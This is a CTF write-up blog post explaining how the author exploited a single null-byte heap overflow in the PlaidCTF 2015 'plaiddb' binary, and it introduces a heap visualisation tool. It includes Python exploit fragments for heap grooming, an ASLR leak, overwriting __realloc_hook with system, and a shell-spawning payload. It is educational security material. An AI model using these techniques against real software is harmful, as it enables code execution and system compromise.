---
layout: post
title: Visualizing a single null-byte heap overflow exploitation
author: wapiflapi
tags:
- plaidctf
- CTF
- 2k15
- writeup
- heap
- exploit
- villoc
- visualization
---

When Phantasmal Phantasmagoria wrote [_The Malloc Malleficarum_][1] back in 2005
he exposed several ways of gaining control of an exploitation through corruption
of the internal state of the libc memory allocator. Ten years later people are
still exploring the possibilities offered by such complex data structures. In
this article I will present how I solved a [challenge][2] from Plaid CTF 2015
and the [tool][3] I wrote in the process.

Phantasmal's paper addressed the patches by libc developers to address previous
exploitation techniques. Some of the insights he presented are still relevant
and people continue go further but new techniques emerged. Project Zero gave a
good example of this with [_The Poisoned NUL Byte_][4] which they presented in
2014.

[1]: http://packetstorm.sigterm.no/papers/attack/MallocMaleficarum.txt
[2]: http://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb
[3]: http://github.com/wapiflapi/villoc
[4]: http://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html


# Quick fuzzing of the target reveals some memory errors

After reverse engineering most of the target we had a pretty good understanding
of what we were up against. A basic main loop prompting the user and yielding
control to a different function for each valid user command:

  - `do_get`, `do_put`, `do_del`, `do_dump`

Those are pretty explicit, by looking at what they are doing we can easily
figure out what they are working on. We already knew the application had to be
storing key value pairs because that's what the user interface is all about.

These are stored in a binary tree, the `node` structure looks like this:

```
00000000 key             dq ; char *
00000008 datasz          dq ; long
00000010 val             dq ; char *
00000018 left            dq ; node *
00000020 right           dq ; node *
00000028 parent          dq ; node *
00000030 is_leaf         dq ; bool
```

Everything is stored on the heap using `malloc`, `realloc` and `free`, we
already see where this is going: a typical heap overflow challenge. As we didn't
notice any obvious UAFs or buffer overflows during our initial recon we decided
to write a very simple fuzzer. Ten lines of python trying random operations. We
maintained a set of about a dozen keys from which we picked at random with of
course the possibility to replace existing keys with new ones from time to time.

Running the **fuzzer with valgrind** immediately exposed memory errors. Looking
at the faulty instruction it was **immediately obvious where the bug lay**. The
function used to read a key from stdin doubles the size of its internal buffer
using `realloc` when it doesn't have enough space but fails to check this when
adding the final null byte. **This causes a one (null) byte overflow on the
heap.**

We adapted our fuzzer so it would run into this case a lot more in the hope of
crashing the application instead of just generating valgrind warnings. The
simple change consists in picking key sizes that would cause this overflow:

`(sz + 8) % 16 == 0, x >= 24`

This new fuzzer crashes the application in less than a couple seconds. Most
often because of an abort due to malloc's integrity checks, sometimes because of
a segfault when the allocator is reading it's internal data structures. We are
getting somewhere.

# We need better visualization tools

Last time I played with the heap for exploitation was when I wanted a shell on
[fruits][5]. Basically I spent a couple hours badly drawing schematics of the
heap on pieces of paper. This time I decided to invest in writing a tool that
would do that for me. [Villoc][3] is a python script that parses the output of
ltrace and writes a static html file that's a lot easier to read than my sketchy
drawings. Also several people can look at the same rendering which is pretty
useful.

If we open up some of our test cases we can easily figure out what is
happening. We pick a promising one, it aborted with the following error:

[3]: http://github.com/wapiflapi/villoc
[5]: /2014/04/30/getting-a-shell-on-fruits-bkpctf-2014/

```
*** Error in `./datastore_7e64104f876f0aa3f8330a409d9b9924.elf':
free(): invalid pointer: 0x00005555557582a0 ***
```

[![villoc rendering of a crash][7]][6]
This is the lower-right part of [the full rendering here][6].

Villoc shows the state of the heap after each function call that changes it. An
important thing to note is that the blocks represented by villoc are memory
chunks **including the malloc overhead** whereas the values given by ltrace and
shown between each state are those seen by the user. This is also true for block
sizes: the first value is the real block size, the one enclosed in parenthesis
is the one the user asked for.

The green block at `0x555555758218` is a key, it was reallocated several
times before the timeframe shown in this screenshot. This is where our overflow
occurs, the final null byte of this key is in fact written in the first byte of
the red block at `0x555555758298` that was already allocated. The red block
contains data, we know this because it is not the right size for a node (0x38)
and it has never been reallocated so it can't be a key itself.

What happens is that the last operation of the crashing test case is a DEL, the
yellow block that is being reallocated is a new key and when it's done it tries
to free the red (data) block and crashes. This is shown by villoc by coloring
the state in red and marking the faulty block.

Remember this is the block the green block overflowed into, so why exactly does
this cause `free` to abort with a message about an invalid pointer? It turns out
the reason for this is pretty unsatisfying: We corrupted the malloc meta-data at
the beginning of the block. That's really all it is.

[6]: /public/res/single-null-byte-heap-overflow/fuzed_crash.html
[7]: /public/res/single-null-byte-heap-overflow/fuzed_crash.png

# Taking control of the application

Project Zero [talked about this][4] and explains how it is possible to setup the
heap in such a way that a single null byte overflow can be leveraged to attack
the heap. That exact attack wasn't usable because it relies on Fedora not
activating some `assert`s in production code but the challenge was running on
Ubuntu which *does* activate them. I took a different road and only the initial
corruption is the same.

[4]: http://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html

When doing exploitation and not immediately being able to influence data
controlling the execution flow one must always ask the following question:
**What _do_ I control?** This is simply what you'll have to work with, so make
sure to be exclusive with your list.

The header of a chunk is its size, this size is always a multiple of 16. This is
important because the lower bits are used as flags:

```C++
#define PREV_INUSE     0x1  // previous adjacent chunk is in use
#define IS_MMAPPED     0x2  // the chunk was obtained with mmap()
#define NON_MAIN_ARENA 0x4  // the chunk isn't in the main arena

// I'm not so sure those comments are really useful though.
```

On little-endian architectures those are the bits we'll be overflowing with our
null byte. If the size of the chunk we are overflowing into is a multiple of 256
then we'll exactly clear those bits without changing the block's size which
could have consequences and make our lives harder.

Clearing `IS_MAPPED` and `NON_MAIN_ARENA` is probably harmless as they'd
probably be zero already. This leaves us with `PREV_INUSE` which is promissing
because it is guaranteed that we are changing something here. The block
preceding the block we are corrupting is obviously the block we are overflowing
and therefore it should always be in use. So what happens if we mark it as
freed?

Remember the null byte is written past the green block and corrupting the flags
of the red one.

When freeing the red block it will check the block preceding it. If it is free
the two blocks will be merged. When a block is not used malloc stores meta-data
not only in the header but also in places where there would normally be user
data. In particular **it stores the size of the free block at the very end of
the block**. This way when the red block is being freed and it notices the
previous block is supposed to be free as well, it can find the beginning of the
supposedly free block by looking right in front of its own header to get the
size of the previous block. Because the previous block, **the green one**, isn't
actually free the data `free()` looks at when getting this size is **controlled
by us**.

Now we know what we really control through this one null byte overwriting some
malloc bookkeeping. The question is what to do with it. Project Zero sets a size
such that the header of the supposedly free block is designer controlled. Then
they craft a fake header somewhere containing arbitrary pointers that will
eventually cause an old school unlink-type write-what-where. Even if we were
targeting Fedora and this could work, we wouldn't be able to pull it off because
we never bypassed ASLR and the challenge is PIE. This means **we'll need to make
our fake chunk start at an existing free chunk**, that's the only place where
we'll find valid pointers.

After spending some time on this and a lot of experimentation I came to the
conclusion that it's a bad idea to end-up with a node, its key and its data
inside the fake free chunk. Because it makes it more difficult to leverage it in
the end since overwriting some part will probably overwrite the previous parts
as well and as we haven't leaked ASLR yet it'll be hard to craft a consistent
data structure for the application to work with.

From now on I'll explain parts of the heap feng shui used in my final
exploit. The full visualization of this can be found [here][8].

[![first part of the full exploit][9]][8]
This is the first part of [the full exploit visualization here][8].

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[9]: /public/res/single-null-byte-heap-overflow/create_hole.png

You'll learn to recognize the basic pattern of allocating a node (green), this
is done even for look-ups of existing keys, followed by a malloc and optional
re-allocations for the key (sea green), and finally a malloc of a user
controlled size for the data (red). This pattern is repeated with the purple,
brown, yellow sequence. The corresponding operations are:

```python
# This makes a hole between x's key and value.
PUT(b"x" * 0x100, b"X" * 0xff)
PUT(b"x" * 0x100, b"X" * 0xff)
```

We made a hole. The freed block in the middle will be the one we'll make our
fake free chunk point to. Then the _messy_ zone will only affect the data which
we don't care about, it can contain anything without affecting the stability of
the application's data.

Now we need to temporarily fill this hole so it's not used by what we'll do next.

```python
# Fill up the hole with something we can remove later.
PUT(b'pad1', b'B' * 0xe7)
PUT(b'pad2', b'B' * 0x197)
```

[![temporarily fill the created hole][10]][8]
Temporarily fill the created hole ([full exploit visualization here][8]).

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[10]: /public/res/single-null-byte-heap-overflow/fill_hole.png

Next we need to take some precautions that are only indirectly related to what
we want to achieve. We create a large hole in which all the future allocations
will be done followed by a wall we'll _never_ touch. This will protect us
against the specific behavior when taking memory from the wilderness.

```python
# Build a wall against the wilderness.
PUT(b"_" * 0x80, b"Y" * 0x8b0)
PUT(b"wall", b"W" * 0x20, trim=True)
DEL(b"_" * 0x80)
```

[![temporarily fill the created hole][11]][8]
Build a wall against the wilderness ([full exploit visualization here][8]).

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[11]: /public/res/single-null-byte-heap-overflow/build_wall.png

### The plan.

Now the plan is to reproduce our crashing test-case in this space and we'll be
able to make our fake chunk point to the empty space we made before (after we'll
have deleted the temporary fillings.) We'll end up with a huge fake free chunk
covering the data of the first allocated key (the yellow block) and whatever we
put after that if we decide to make the free chunk big enough.

```python
# Now create the setup where we can off-by-one.
PUT(b"a" * 247, b"A" * 123)
PUT(b"a" * 247, b"A" * 240)
```

[![trigger corruption stage 1][12]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[12]: /public/res/single-null-byte-heap-overflow/corrupt_stage1.png

> **Put:** Node, Key, Val; **Put again!** Node, (same) Key, Val.

```python
# This computation is the size of our fake free chunk.
# It should make it start at the beginning of the filled up hole we control;
fake_sz = 0x100 + 0x40 + 0x190 + 0x40 + 0x110 + 0x1a0
craftedkey = struct.pack("Q", fake_sz).rjust(248, b"b")
PUT(craftedkey, b"B" * 245)
```

[![trigger corruption stage 3][13]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[13]: /public/res/single-null-byte-heap-overflow/corrupt_stage2.png

> **Put:** Node, (different) Key. (Val not shown, it's to the right.)

**This triggers the corruption.** This time it's right where we want it. The
key, the block that is re-allocated in the last screenshot above ends up at
`0x555555758938` and overwrites the first byte of the header of the data block
right after it at `0x555555758a38`. The effect is we clear the flags that were
stored there and in particular the `PREV_INUSE` flag. We effectively mark the
previous block as free and `free()` will attempt to merge the block we are
corrupting with its predecessor when we free it. It will find the beginning of
the previous block by looking at the size stored at the end of a free block,
right in front of the header of the block being freed. We control this size and
you can see the computation in the python code above.

Now let's delete the temporary padding we setup earlier and take a look at the
state of the full heap when that's done:

```python
# Clear the hole we made before.
DEL(b'pad1')
DEL(b'pad2')
```

[![trigger corruption stage 3][14]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[14]: /public/res/single-null-byte-heap-overflow/corrupt_after.png

The bottom line of this image is a screen-shot of villoc, I added big colored
rectangles on top to be able to explain more easily bellow, from left to right:

 - **initial key/val**: The green marker at the left shows three blocks that
   never moved, those are the three memory allocation (node, key, val) for the
   initial value the program stores in it's database at the very beginning of
   it's `main` function.

 - **our hole**: Next the big red marker is the result of our first operation
   preserved by the padding we setup. We have a node followed by its key, a
   large gap and the associated data.

 - **victim**: The purple marker shows the victims of our corruption, first the
   node and key, and further to the right the data. This data block is the one
   we corrupted malloc's bookkeeping of.

 - **overflower**: The blocks marked in yellow are the node, key and value of
   the entry we overflowed. We overflowed the key into the data marked purple.

 - **the wall**: At the far right we have three blocks in blue that never moved,
   this is the wall protecting against the wilderness.


Make sure you understand this picture of the heap. We'll free the nodes marked
purple next and see how it affect's malloc's representation of the heap. Keep in
mind the data (last block) of this entry is corrupted and will cause malloc to
think there is a huge freed chunk before it. We control the size of this chunk
through the last bytes of the block we overflowed (yellow data).

```python
# Commandeer the heap.
DEL(b"a" * 247)
```

[![trigger corruption stage 3][15]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[15]: /public/res/single-null-byte-heap-overflow/corrupt_cleared.png

As you can see this `DEL` causes a key to be re-allocated several times in the
space left of the wall. Once it has the full key the existing key is freed,
followed by the associated data and node. Finally the key used to do the look-up
is freed as well. **This successfully freed our corrupted chunk.** (The small
hole right in front of the reddish block on the right side of the image.)

I highlighted the region malloc considers freed after this operation in
blue. Yes it's big. This is what we wanted and what we computed a few python
lines ago. **The main corruption is now finished.** The heap is a total mess and
we'll be able to manipulate in ways the application will have several data
structures using the same memory.

Let's start confusing the program. We `GET` the value associated with the very
first key we put in the database, this is the one where we made sure there was a
hole between the key and the data. Look what happens:

```python
get(b"x" * 0x100)
```

[![trigger corruption stage 3][16]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[16]: /public/res/single-null-byte-heap-overflow/leak.png

The end of the key used for the look-up uses the same memory as the data it's
fetching. When this `realloc` happens some meta-data is updated. in particular
since we took a piece of a supposedly large free chunk the header of what
remains of this chunk after the allocation needs to be written. This is in the
middle of the data. **When the application prints the data we request it will
leak this header.** before returning the data to the user the temporary key is
freed.

The header in question has some pointers to other parts of the heap and also to
some values used by malloc that are stored inside the libc. **We successfully
bypassed aslr** by leaking heap and libc addresses.


# Alternatives to the unlink reaction

We now control the heap, not entirely, but its enough of a mess to be able to
make some interesting constructions. We need to start thinking about what we
want to achieve with this. The next step is gaining control over the execution
flow.

The classic approach when exploiting structures like linked lists or trees is to
fallback to the old unlink-style *read-almost-what-almost-where* primitive. The
code for deleting elements in such data structures looks like this:

```c++
to_be_deleted->next->prev = to_be_deleted->prev;
to_be_deleted->prev->next = to_be_deleted->next;
```

We could confuse the program and commandeer a node, once it will be deleted
we'll have something looking like the code above. But there is an inherent
limitation to this style of *read-what-where*: It's done in two directions, this
means the value we are writing must be a pointer to writable memory, because the
address we are writing to will be written back to what the value points to. Read
that again if you didn't get it. In short with this technique you can't
overwrite a function pointer because executable memory won't be writable.

Another write-up for this challenge written by frizn can be found [here][19], he
choose to solve this problem.

[19]: http://blog.frizn.fr/pctf-2015/pwn-550-plaiddb

But before we're going through the trouble of finding something we can control
the execution flow with using this technique, let's take a moment to check if
something else is easier. To be honest i never reversed engineered the function
handling `del` in the target binary. One function i did look at (because it was
way smaller and i'm lazy) is the one doing the work for `put`. This is an
excerpt:


```c
old_node = add_node(new_node);

if ( old_node ) {
  free(new_node->key);
  free(old_node->val);
  old_node->datasz = new_node->datasz;
  old_node->val = new_node->val;
  free(new_node);
  puts("info: update successful.");
}
else {
  puts("info: insert successful.");
}
```

When a key is already present in the database it updates the associated value
before freeing the `new_node`. My idea was to make it believe there is a node
located where i want to write to. It'll overwrite my target with the size of the
new data we're sending and with a pointer to this data. But you'll see later
that we can subvert this limitation.

#### How do we setup a fake node anywhere in memory?

This is surprisingly easy, we just need to overwrite an existing node and set
it's `left` or `right` pointer to where we want our fake node to be. The only
requirement is the first entry of our fake node should be a valid pointer
because this is supposed to be the key.

We'll be able to update this node by using the `PUT` operation with a key
matching whatever the first pointer in our phony node happens to point to.

#### How do we overwrite with an arbitrary value?

What I explained before is that the value being written is the size of the data
and the pointer to the data. Those aren't arbitrary. But we get around this
thanks to particular heap setup we'll be using. We'll have a large controlled
(data) block that is overlapping the node we'll be tampering with in order
to set up our fake node over the target. This same large controlled block will
also overlap it's own key, the one used to do the `PUT`. Because of this we'll
be able to set the size and data fields to whatever we want before they are
copied to the fake node located at our target.

#### Putting it together


[![trigger corruption stage 3][17]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[17]: /public/res/single-null-byte-heap-overflow/overwrite.png

The temporary node is created in the middle because of a fastbin of the right
size, then the key to the left and the data takes the remaining space because we
made it just big enough. On the screenshot of villoc you can clearly see the
different overwrites: first we overwrite some data in the middle followed by our
own temporary node and finally we overwrite a node that already existed. We'll
the later point to our target and setup the temporary node to point to a key
containing the right data.

The code bellows creates the huge data with all the right values:

```python
# Align on a multiple of 16 so the pointer passed to free() is valid.
overwrite = b"0" * 8

# Craft a fake freeable key
overwrite += struct.pack("Q", 0x101)    # keep malloc happy
fake_key = data + len(overwrite)
overwrite += target_key + b"\x00"
overwrite  = overwrite.ljust(0x100, b"0")
overwrite += struct.pack("Q", 0)        # padding
overwrite += struct.pack("Q", 0x101)    # keep malloc happy

# This puts us at the begining of our own node.
# This is the temporary node for the PUT.
overwrite  = overwrite.ljust(0x438, b"1")

overwrite += struct.pack("Q", 0x41)     # keep malloc happy
overwrite += struct.pack("Q", fake_key) # we need to craft a key.
overwrite += struct.pack("Q", 0x0)      # size
overwrite += struct.pack("Q", system)   # This will be writtent to target.
overwrite += struct.pack("Q", 0x525252) #
overwrite += struct.pack("Q", 0x525253) #
overwrite += struct.pack("Q", 0x525254) #
overwrite += struct.pack("Q", 0)        # padding
overwrite += struct.pack("Q", 0x201)    # keep malloc happy

# Now get to the next node, we'll make it point to our target.
overwrite  = overwrite.ljust(0x608, b"T")

overwrite += struct.pack("Q", 0x41)     # keep malloc happy
overwrite += struct.pack("Q", www)      # we need a freable key.
overwrite += struct.pack("Q", 0x0)
overwrite += struct.pack("Q", 0x0)
overwrite += struct.pack("Q", target-16)# left->data == target
overwrite += struct.pack("Q", 0x626262) # right
overwrite += struct.pack("Q", 0x626263) # parent
overwrite += struct.pack("Q", 0)

# Don't include the final \n as we normally do.
PUT(b"setup", overwrite, trim=True)
```

The only thing left to do is find a suitable target and value. This is rather
easy. We'll target `__realloc_hook` and overwrite it with `system`. This matches
our requirements because there is a valid pointer at the right offset before
`__realloc_hook` that can be used as the key.

Let's look at what happens during the `PUT`:

[![trigger corruption stage 3][18]][8]

[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[18]: /public/res/single-null-byte-heap-overflow/overwrite_followup.png

The first line is the allocation of the data that overwrites everything. Next we
see that **villoc points out there is an error** because we are freeing an
unknown chunk. This is the fake key we created, the update is done and it is no
longer needed. This is why it was so important this was freeable. We succeeded
because `free()` didn't complain or crash. You can see villoc marks the unknown
chunk dashed and it matches where we build our fake key near the begining of our
huge data.

On the next line nothing seems to happen, it's a `free(0x0)`. We didn't bother
setting up a valid value for the data pointer of the temporary node after we
overwrote it and just set it to null. Finally the temporary node itself is
freed.

#### Now we get a shell

We are almost there! Now whenever we cause a call to `realloc()` the hook we
installed will cause `system()` to be called. It's first argument with be the
same as `realloc`'s: the key being re-allocated.

```python
# Now we control __realloc_hook, trigger it.
PUT(b"sh < /dev/stdout;" + b":;" * 100, b"foo")
```


# Comments and advice

When working on complex data structures, be it the heap or something else, it is
important to have a good understanding of what is going on. Visualization is
essential, at least for me it is. I wrote [villoc][3] during PlaidCTF 2015 to
solve the challenge presented in this article. I made some patches afterwards to
fix some bugs, but this is nowhere near how good it could be. This version won't
handle large programs well and it doesn't show a lot of interesting
information. For example it would be great to have something with pintools or
even a simple shared library that could do inspection to show what data is
stored where.

In exploitation in general never despair when you don't even control what you
control. Systems are so complex that even the tiniest corruptions can often be
leveraged in the right context. Your job as a designer is to understand what is
going on and master the system enough to be able to create this context.

> In virtuality there is no level of privilege, no logical barrier between
> systems, no point of illegality. There is only information and those that can
> invoke it. -- Phantasmal Phantasmagoria

[1]: http://packetstorm.sigterm.no/papers/attack/MallocMaleficarum.txt
[2]: http://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb
[3]: http://github.com/wapiflapi/villoc
[4]: http://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html
[5]: /2014/04/30/getting-a-shell-on-fruits-bkpctf-2014/
[6]: /public/res/single-null-byte-heap-overflow/fuzed_crash.html
[7]: /public/res/single-null-byte-heap-overflow/fuzed_crash.png
[8]: /public/res/single-null-byte-heap-overflow/exploit.html
[9]: /public/res/single-null-byte-heap-overflow/create_hole.png
[10]: /public/res/single-null-byte-heap-overflow/fill_hole.png
[11]: /public/res/single-null-byte-heap-overflow/build_wall.png
[12]: /public/res/single-null-byte-heap-overflow/corrupt_stage1.png
[13]: /public/res/single-null-byte-heap-overflow/corrupt_stage2.png
[14]: /public/res/single-null-byte-heap-overflow/corrupt_after.png
[15]: /public/res/single-null-byte-heap-overflow/corrupt_cleared.png
[16]: /public/res/single-null-byte-heap-overflow/leak.png
[17]: /public/res/single-null-byte-heap-overflow/overwrite.png
[18]: /public/res/single-null-byte-heap-overflow/overwrite_followup.png
